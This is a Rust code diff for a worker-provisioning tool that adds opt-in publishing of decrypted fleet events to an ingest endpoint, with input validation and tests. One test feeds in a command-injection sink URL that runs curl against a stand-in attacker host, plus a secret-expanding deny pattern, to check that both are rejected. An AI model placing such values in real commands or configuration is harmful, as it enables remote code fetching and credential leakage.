@@ -66,6 +66,30 @@ const DEFAULT_SAFEHOUSE_INVITE_EXEC: &str =
 /// so a non-Linux target is refused up front rather than half-provisioned.
 const SUPPORTED_TARGET_UNAME: &str = "Linux";
 
+/// Default fleet-feed ingest endpoint a worker's opt-in `[egress]` block
+/// publishes decrypted `completion-v1` events to (issue #6383). Not secret;
+/// overridable via `--feed-egress-sink-url` for a fork's own feed backend.
+pub const DEFAULT_FEED_EGRESS_SINK_URL: &str = "https://2amlogic.com/api/ingest";
+
+/// Default `delay_seconds` a worker's opt-in `[egress]` block buffers a
+/// decrypted event by before publishing it (issue #6383) — mirrors the one
+/// hand-configured publisher's (`robb-studio`) current value.
+pub const DEFAULT_FEED_EGRESS_DELAY_SECONDS: u32 = 300;
+
+/// Default narration-scrub `deny_patterns` for a worker's opt-in `[egress]`
+/// block (issue #6383) — mirrors the fleet's current hand-configured list.
+/// A parameter threaded from [`AddWorkerConfig`] into the rendered template
+/// (not a literal baked into [`render_safehouse_config`]), overridable per
+/// host via repeated `--feed-egress-deny-pattern`.
+#[must_use]
+pub fn default_feed_egress_deny_patterns() -> Vec<String> {
+    vec![
+        "safehouse.2amlogic.com".to_string(),
+        "/Users/rwalters".to_string(),
+        "ip-172-31-".to_string(),
+    ]
+}
+
 /// The probe run on the target host — before any plan step — to learn its
 /// platform (#5395). Deliberately the cheapest possible remote command: it
 /// needs no `sudo`, writes nothing, and exists on every POSIX host.
@@ -138,6 +162,29 @@ pub struct AddWorkerConfig {
     /// safehoused's real CLI surface (owned by the external repo), so this
     /// mirrors `safehoused-service.sh --exec`.
     pub safehouse_invite_exec: Option<String>,
+    /// Whether to write a `[egress]` block into this worker's
+    /// `~/.loom/safehoused/config.toml` so it publishes decrypted
+    /// `completion-v1` fleet-feed events from birth (issue #6383). Opt-in —
+    /// a consumer of loom with no public feed must not get a dangling sink.
+    /// Requires `safehouse_enabled` (egress publishes from the same room
+    /// safehoused already decrypts) plus `feed_egress_ingest_key_file`.
+    pub feed_egress_enabled: bool,
+    /// Local path to a file holding the fleet-feed ingest key (a single
+    /// secret value, no `KEY=VALUE` framing required). Read locally at
+    /// preflight; transferred to the worker only via ssh stdin, appended to
+    /// the same sourced-then-deleted `$ENV_FILE` the safehouse Matrix
+    /// credentials already travel over (never a literal in the rendered
+    /// config template). Required when `feed_egress_enabled`.
+    pub feed_egress_ingest_key_file: Option<PathBuf>,
+    /// Fleet-feed ingest endpoint the worker's `[egress]` block publishes
+    /// completions to. Not secret.
+    pub feed_egress_sink_url: String,
+    /// Narration-scrub patterns applied before publication — a parameter,
+    /// not a literal baked into the rendered template (issue #6383).
+    pub feed_egress_deny_patterns: Vec<String>,
+    /// Seconds the worker's `[egress]` block buffers a decrypted event
+    /// before publishing it.
+    pub feed_egress_delay_seconds: u32,
 }
 
 /// Secret payloads read locally during preflight, then fed to the plan over
@@ -154,6 +201,9 @@ pub struct Secrets {
     /// The safehouse secrets env-file contents, if
     /// `--safehouse-secrets-file` was supplied.
     pub safehouse_secrets: Option<String>,
+    /// The fleet-feed ingest key, if `--feed-egress-ingest-key-file` was
+    /// supplied (issue #6383).
+    pub feed_egress_ingest_key: Option<String>,
 }
 
 /// The production [`CommandRunner`]: runs one rendered shell command per call
@@ -370,6 +420,37 @@ pub fn preflight(config: &AddWorkerConfig) -> Result<Secrets> {
             validate_persona_name(persona)?;
         }
     }
+
+    // Fleet-feed egress (#6383): opt-in, and only meaningful alongside
+    // safehouse (egress publishes decrypted events from the same room
+    // safehoused already joins/decrypts). Checked here — structural, before
+    // any file is read — so a dangling `--feed-egress` (no `--safehouse`) or
+    // a `--feed-egress` with no ingest key supplied fails fast rather than
+    // tripping over an unrelated safehouse secret file first.
+    if config.feed_egress_enabled && !config.safehouse_enabled {
+        bail!(
+            "--feed-egress requires --safehouse (egress publishes decrypted events from the \
+             same room safehoused decrypts)"
+        );
+    }
+    if config.feed_egress_enabled && config.feed_egress_ingest_key_file.is_none() {
+        bail!("--feed-egress requires --feed-egress-ingest-key-file");
+    }
+    // `feed_egress_sink_url` and `feed_egress_deny_patterns` are interpolated
+    // into the same unquoted heredoc as `homeserver`/`room` in
+    // `render_safehouse_config` — so, like those fields, they must be
+    // shell-safe before they are ever rendered. Without this, an
+    // operator-supplied deny-pattern or sink URL containing `$` or backticks
+    // could have the remote shell expand it against the secrets already
+    // exported into that shell (`SAFEHOUSE_MATRIX_PASSWORD`,
+    // `FLEET_FEED_INGEST_KEY`, ...) or execute arbitrary commands.
+    if config.feed_egress_enabled {
+        validate_safe_token("feed-egress-sink-url", &config.feed_egress_sink_url, ".:/_-?=&")?;
+        for pattern in &config.feed_egress_deny_patterns {
+            validate_safe_token("feed-egress-deny-pattern", pattern, ".:/_-?=&")?;
+        }
+    }
+
     if let Some(path) = &config.safehouse_tailnet_auth_key_file {
         let contents = std::fs::read_to_string(path).with_context(|| {
             format!("reading --safehouse-tailnet-auth-key-file {} (does it exist?)", path.display())
@@ -388,6 +469,19 @@ pub fn preflight(config: &AddWorkerConfig) -> Result<Secrets> {
             bail!("--safehouse-secrets-file {} is empty", path.display());
         }
         secrets.safehouse_secrets = Some(contents);
+    }
+
+    // Fleet-feed egress ingest key (#6383): structural presence was already
+    // validated above; read + trim it here, alongside the other secret files.
+    if let Some(path) = &config.feed_egress_ingest_key_file {
+        let contents = std::fs::read_to_string(path).with_context(|| {
+            format!("reading --feed-egress-ingest-key-file {} (does it exist?)", path.display())
+        })?;
+        let trimmed = contents.trim();
+        if trimmed.is_empty() {
+            bail!("--feed-egress-ingest-key-file {} is empty", path.display());
+        }
+        secrets.feed_egress_ingest_key = Some(trimmed.to_string());
     }
 
     Ok(secrets)
@@ -721,15 +815,32 @@ fn push_safehouse_steps(
     //     10f (first start) — see this function's doc comment.
     let homeserver = config.safehouse_homeserver_url.as_deref().unwrap_or("");
     let room = config.safehouse_room.as_deref().unwrap_or("");
+    let egress_params = config.feed_egress_enabled.then(|| EgressParams {
+        room,
+        deny_patterns: &config.feed_egress_deny_patterns,
+        delay_seconds: config.feed_egress_delay_seconds,
+        sink_url: &config.feed_egress_sink_url,
+    });
+    let config_step_description = if config.feed_egress_enabled {
+        "write ~/.loom/safehoused/config.toml (0600): homeserver, account, passphrases, \
+         personas, egress"
+    } else {
+        "write ~/.loom/safehoused/config.toml (0600): homeserver, account, passphrases, personas"
+    };
     plan.push_step(
         Step::new(
             "safehouse-config",
-            "write ~/.loom/safehoused/config.toml (0600): homeserver, account, passphrases, personas",
+            config_step_description,
             Some(r#"test -f "$HOME/.loom/safehoused/config.toml""#.to_string()),
-            render_safehouse_config(homeserver, room, &config.safehouse_personas),
+            render_safehouse_config(
+                homeserver,
+                room,
+                &config.safehouse_personas,
+                egress_params.as_ref(),
+            ),
         )
         .with_stdin(StepStdin {
-            content: secrets.safehouse_secrets.clone().unwrap_or_default(),
+            content: safehouse_config_stdin(secrets, config.feed_egress_enabled),
             secret: true,
         }),
     );
@@ -1424,6 +1535,39 @@ install -m 0755 "$SH_SRC/target/release/safehoused" "$HOME/.local/bin/safehoused
     )
 }
 
+/// Operator-controlled fleet-feed egress parameters rendered into the
+/// worker's boot-time `config.toml` (issue #6383). `room` and `sink_url` are
+/// pre-validated/operator-supplied non-secret values; the ingest key itself
+/// is never held here — [`render_safehouse_config`] references it only via
+/// the `$FLEET_FEED_INGEST_KEY` shell variable sourced from the same
+/// `$ENV_FILE` the Matrix credentials already travel over.
+struct EgressParams<'a> {
+    room: &'a str,
+    deny_patterns: &'a [String],
+    delay_seconds: u32,
+    sink_url: &'a str,
+}
+
+/// Combine the safehouse Matrix-account env-file contents with the
+/// fleet-feed ingest key (when egress is opt-in) into the single stdin
+/// payload the `safehouse-config` step sources through `$ENV_FILE` (issue
+/// #6383) — the ingest key travels the same sourced-then-deleted mechanism
+/// as the rest of this step's secrets, never a literal in the rendered
+/// template.
+fn safehouse_config_stdin(secrets: &Secrets, feed_egress_enabled: bool) -> String {
+    let mut content = secrets.safehouse_secrets.clone().unwrap_or_default();
+    if feed_egress_enabled {
+        if !content.is_empty() && !content.ends_with('\n') {
+            content.push('\n');
+        }
+        content.push_str(&format!(
+            "FLEET_FEED_INGEST_KEY={}\n",
+            secrets.feed_egress_ingest_key.clone().unwrap_or_default()
+        ));
+    }
+    content
+}
+
 /// `homeserver`/`room` are pre-validated shell-safe (`validate_safe_token`) by
 /// [`preflight`] before this is ever called. `personas` are pre-validated by
 /// [`validate_persona_name`] — safe to interpolate as bare TOML string
@@ -1431,12 +1575,37 @@ install -m 0755 "$SH_SRC/target/release/safehoused" "$HOME/.local/bin/safehoused
 /// as a `KEY=VALUE` env file and are sourced into shell variables that are
 /// referenced (never literal) in the rendered heredoc, so the secret VALUES
 /// never appear in this rendered text (only the variable NAMES do).
-fn render_safehouse_config(homeserver: &str, room: &str, personas: &[String]) -> String {
+///
+/// `egress` is `Some` only when fleet-feed egress is opt-in (issue #6383):
+/// the appended `[egress]` block's `sink_url` references
+/// `$FLEET_FEED_INGEST_KEY` (sourced from the same `$ENV_FILE` as the Matrix
+/// credentials above) rather than embedding the key as a literal.
+fn render_safehouse_config(
+    homeserver: &str,
+    room: &str,
+    personas: &[String],
+    egress: Option<&EgressParams<'_>>,
+) -> String {
     let persona_list = personas
         .iter()
         .map(|p| format!("\"{p}\""))
         .collect::<Vec<_>>()
         .join(", ");
+    let egress_block = match egress {
+        Some(e) => {
+            let deny_list = e
+                .deny_patterns
+                .iter()
+                .map(|p| format!("\"{p}\""))
+                .collect::<Vec<_>>()
+                .join(", ");
+            format!(
+                "\n[egress]\nrooms = [\"{}\"]\ndeny_patterns = [{deny_list}]\ndelay_seconds = {}\nsink_url = \"{}?key=$FLEET_FEED_INGEST_KEY\"\n",
+                e.room, e.delay_seconds, e.sink_url
+            )
+        }
+        None => String::new(),
+    };
     format!(
         r#"set -e
 umask 077
@@ -1459,7 +1628,7 @@ password = "$SAFEHOUSE_MATRIX_PASSWORD"
 [encryption]
 store_passphrase = "$SAFEHOUSE_STORE_PASSPHRASE"
 recovery_passphrase = "$SAFEHOUSE_RECOVERY_PASSPHRASE"
-TOML
+{egress_block}TOML
 chmod 600 "$HOME/.loom/safehoused/config.toml"
 rm -f "$ENV_FILE"
 "#
@@ -1539,6 +1708,11 @@ mod tests {
             safehouse_room: None,
             safehouse_personas: Vec::new(),
             safehouse_invite_exec: None,
+            feed_egress_enabled: false,
+            feed_egress_ingest_key_file: None,
+            feed_egress_sink_url: DEFAULT_FEED_EGRESS_SINK_URL.to_string(),
+            feed_egress_deny_patterns: default_feed_egress_deny_patterns(),
+            feed_egress_delay_seconds: DEFAULT_FEED_EGRESS_DELAY_SECONDS,
         }
     }
 
@@ -1568,6 +1742,7 @@ mod tests {
                  SAFEHOUSE_RECOVERY_PASSPHRASE=recovery-pass-xyz\n"
                     .to_string(),
             ),
+            feed_egress_ingest_key: None,
         }
     }
 
@@ -2552,6 +2727,167 @@ exit 0
         assert!(step.apply.contains("$SAFEHOUSE_STORE_PASSPHRASE"));
         assert!(step.apply.contains("$SAFEHOUSE_RECOVERY_PASSPHRASE"));
         assert!(!step.apply.contains("hunter2-matrix-pw"));
+    }
+
+    // ---- fleet-feed egress (#6383) --------------------------------------
+
+    fn feed_egress_secrets() -> Secrets {
+        let mut secrets = safehouse_secrets();
+        secrets.feed_egress_ingest_key = Some("ingest-key-xyz".to_string());
+        secrets
+    }
+
+    fn feed_egress_config() -> AddWorkerConfig {
+        let mut config = safehouse_config();
+        config.feed_egress_enabled = true;
+        config.feed_egress_ingest_key_file = Some(PathBuf::from("/does/not/matter"));
+        config
+    }
+
+    #[test]
+    fn feed_egress_opt_in_writes_valid_egress_block() {
+        let config = feed_egress_config();
+        let secrets = feed_egress_secrets();
+        let plan = build_plan(&config, &secrets);
+        let step = plan
+            .entries
+            .iter()
+            .find_map(|e| match e {
+                PlanEntry::Step(s) if s.name == "safehouse-config" => Some(s),
+                _ => None,
+            })
+            .unwrap();
+        assert!(step.apply.contains("[egress]"));
+        assert!(step
+            .apply
+            .contains("rooms = [\"!fleet:matrix.internal.example\"]"));
+        for pattern in default_feed_egress_deny_patterns() {
+            assert!(step.apply.contains(&pattern), "missing deny pattern {pattern}");
+        }
+        assert!(step.apply.contains("delay_seconds = 300"));
+        assert!(step.apply.contains(&format!(
+            "sink_url = \"{DEFAULT_FEED_EGRESS_SINK_URL}?key=$FLEET_FEED_INGEST_KEY\""
+        )));
+        // The ingest key never appears as a literal in the rendered template
+        // — only the sourced variable name does.
+        assert!(!step.apply.contains("ingest-key-xyz"));
+
+        // Nor does it leak into the dry-run checklist rendering.
+        let dry = plan.render_dry_run("fleet add-worker", "worker-1");
+        assert!(!dry.contains("ingest-key-xyz"));
+
+        // The key does travel over this step's (secret) stdin, appended to
+        // the same $ENV_FILE payload as the Matrix credentials.
+        let stdin = step.stdin.as_ref().expect("must carry stdin");
+        assert!(stdin.secret);
+        assert!(stdin
+            .content
+            .contains("FLEET_FEED_INGEST_KEY=ingest-key-xyz"));
+        assert!(stdin.content.contains("SAFEHOUSE_MATRIX_USER_ID"));
+    }
+
+    #[test]
+    fn feed_egress_opt_out_writes_no_egress_block() {
+        // Default (opt-in, not opt-out): a config with safehouse enabled but
+        // feed-egress left at its default (false) must not get a dangling
+        // sink.
+        let config = safehouse_config();
+        let plan = build_plan(&config, &safehouse_secrets());
+        let step = plan
+            .entries
+            .iter()
+            .find_map(|e| match e {
+                PlanEntry::Step(s) if s.name == "safehouse-config" => Some(s),
+                _ => None,
+            })
+            .unwrap();
+        assert!(!step.apply.contains("[egress]"));
+        assert!(!step.apply.contains("FLEET_FEED_INGEST_KEY"));
+        let stdin = step.stdin.as_ref().expect("must carry stdin");
+        assert!(!stdin.content.contains("FLEET_FEED_INGEST_KEY"));
+    }
+
+    #[test]
+    fn preflight_feed_egress_requires_safehouse() {
+        let mut config = base_config();
+        config.feed_egress_enabled = true;
+        config.feed_egress_ingest_key_file = Some(PathBuf::from("/does/not/matter"));
+        let err = preflight(&config).unwrap_err().to_string();
+        assert!(err.contains("--feed-egress requires --safehouse"), "err: {err}");
+    }
+
+    #[test]
+    fn preflight_feed_egress_requires_ingest_key_file() {
+        let mut config = feed_egress_config();
+        config.feed_egress_ingest_key_file = None;
+        let err = preflight(&config).unwrap_err().to_string();
+        assert!(
+            err.contains("--feed-egress requires --feed-egress-ingest-key-file"),
+            "err: {err}"
+        );
+    }
+
+    /// A `feed_egress_config()` with every other secret file backed by a
+    /// real, valid temp file (rather than the shared fixtures' `/does/not/
+    /// matter` placeholders) — needed for tests that expect `preflight` to
+    /// run to completion.
+    fn feed_egress_config_with_real_secret_files(dir: &std::path::Path) -> AddWorkerConfig {
+        let key_file = dir.join("tailnet.key");
+        let secrets_file = dir.join("safehouse.env");
+        std::fs::write(&key_file, "tskey-ephemeral-tagged\n").unwrap();
+        std::fs::write(
+            &secrets_file,
+            "SAFEHOUSE_MATRIX_USER_ID=@w1:example\nSAFEHOUSE_MATRIX_PASSWORD=pw\n\
+             SAFEHOUSE_STORE_PASSPHRASE=sp\nSAFEHOUSE_RECOVERY_PASSPHRASE=rp\n",
+        )
+        .unwrap();
+        let mut config = feed_egress_config();
+        config.safehouse_tailnet_auth_key_file = Some(key_file);
+        config.safehouse_secrets_file = Some(secrets_file);
+        config
+    }
+
+    #[test]
+    fn preflight_feed_egress_reads_and_trims_ingest_key() {
+        let dir = tempfile::tempdir().unwrap();
+        let key_file = dir.path().join("ingest.key");
+        std::fs::write(&key_file, "  ingest-key-abc\n").unwrap();
+        let mut config = feed_egress_config_with_real_secret_files(dir.path());
+        config.feed_egress_ingest_key_file = Some(key_file);
+        let secrets = preflight(&config).unwrap();
+        assert_eq!(secrets.feed_egress_ingest_key.as_deref(), Some("ingest-key-abc"));
+    }
+
+    #[test]
+    fn preflight_feed_egress_empty_ingest_key_file_fails() {
+        let dir = tempfile::tempdir().unwrap();
+        let key_file = dir.path().join("ingest.key");
+        std::fs::write(&key_file, "   \n").unwrap();
+        let mut config = feed_egress_config_with_real_secret_files(dir.path());
+        config.feed_egress_ingest_key_file = Some(key_file);
+        assert!(preflight(&config).is_err());
+    }
+
+    /// `feed_egress_sink_url` and `feed_egress_deny_patterns` are
+    /// interpolated into the same unquoted heredoc as `homeserver`/`room`
+    /// (`render_safehouse_config`) after the safehouse Matrix secrets have
+    /// already been exported into that shell — an unvalidated `$` or
+    /// backtick in either would let an operator-supplied value expand a
+    /// sourced secret, or execute a command, into the written config file.
+    /// Mirrors `preflight_rejects_unsafe_homeserver_url_and_room` for these
+    /// two newer fields.
+    #[test]
+    fn preflight_rejects_unsafe_feed_egress_sink_url_and_deny_pattern() {
+        let dir = tempfile::tempdir().unwrap();
+        let mut config = feed_egress_config_with_real_secret_files(dir.path());
+        config.feed_egress_sink_url = "https://evil/$(curl attacker.example/x)".to_string();
+        let err = preflight(&config).unwrap_err().to_string();
+        assert!(err.contains("feed-egress-sink-url"), "err: {err}");
+
+        let mut config2 = feed_egress_config_with_real_secret_files(dir.path());
+        config2.feed_egress_deny_patterns = vec!["$SAFEHOUSE_MATRIX_PASSWORD".to_string()];
+        let err2 = preflight(&config2).unwrap_err().to_string();
+        assert!(err2.contains("feed-egress-deny-pattern"), "err: {err2}");
     }
 
     #[test]
